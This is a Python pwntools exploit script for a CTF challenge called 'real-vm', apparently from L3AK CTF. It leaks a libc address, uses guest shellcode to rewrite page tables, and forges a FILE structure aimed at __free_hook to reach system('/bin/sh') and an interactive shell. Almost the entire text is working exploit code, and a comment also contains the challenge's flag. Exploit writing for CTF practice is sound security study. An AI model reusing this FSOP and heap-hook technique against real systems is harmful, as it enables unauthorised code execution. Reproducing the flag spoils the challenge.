#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('real-vm')
libc = ELF('libc-2.23.so')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')


def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *(main + 1948)
               c
               del
               b fclose
               c
               b _IO_file_close_it
               c
               b _IO_setb
               c
               ''')
#L3AK{KVM_4ND_F50P_1N_0N3_CH4113N63_7H15_MU57_B3_4_Dr34M}
p = process()
GDB(p)
ru(b'Comrade : ')
leak = rl()[:-1]
leak = int(leak.decode(), 16)
libc.address = leak - 0x3c48e0
print('leak: ', hex(leak))
print('libc: ', hex(libc.address))
shellcode = shellcraft.write(1, "hihihih", 0x100)
'''
mov qword ptr [0x1000], 0x2003
mov qword ptr [0x2000], 0x3003
mov qword ptr [0x3000], 0x4003
mov qword ptr [0x4000], 0x0003  # set to original base to rip continue
mov qword ptr [0x4008], 0x16003

mov rax, 0x1000
mov cr3, rax
mov rax, 0xdeadbeef
mov qword ptr [0x1000], 0xdead # open file
mov qword ptr [0x1008], 0xdead
mov qword ptr [0x1008], 0xdead

hlt'''

shellcode = '''
mov qword ptr [0x1000], 0x2003
mov qword ptr [0x2000], 0x3003
mov qword ptr [0x3000], 0x4003
mov qword ptr [0x4000], 0x0003
mov qword ptr [0x4008], 0x16003

mov rax, 0x1000
mov cr3, rax
mov rax, 0
mov qword ptr [0x1008], 0xdead
mov qword ptr [0x1010], 0xdead
mov qword ptr [0x1000], 0xdead
mov rax, 0x100000000110
mov qword ptr [0x1010], 0xdead
mov qword ptr [0x1018], 0xdead

hlt'''
TARGET = libc.address + 0x3c3750 
overwrite = TARGET - 0x78 # change io_do_write
BUF = 0x3c4120 + libc.address
file = p64(0xfbad0000 | 0x800 | 0x2000 | 0x1000 | 0x8000) + p64(0)*3 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['__free_hook'] + 8) + p64(libc.symbols['environ'] + 8)
file += p64(next(libc.search(b'/bin/sh\x00'))) + p64(0)*6 + p64(0) + p64(0)*2 + p64(BUF) + p64(0xffffffffffffffff) + p64(0)*5 + p64(0x0) + p64(0)*2 + p64(overwrite)
payload = bytes(asm(shellcode))
payload = payload.ljust(0x1000, b'\x90')
payload += b'A'*0x20 + p64(0) + p64(0x231) + file
sla(b'Length', str(len(payload)).encode())
sa(b'Comrade', payload)

p.wait(0.5)
s(p64(libc.symbols['system']))
p.interactive()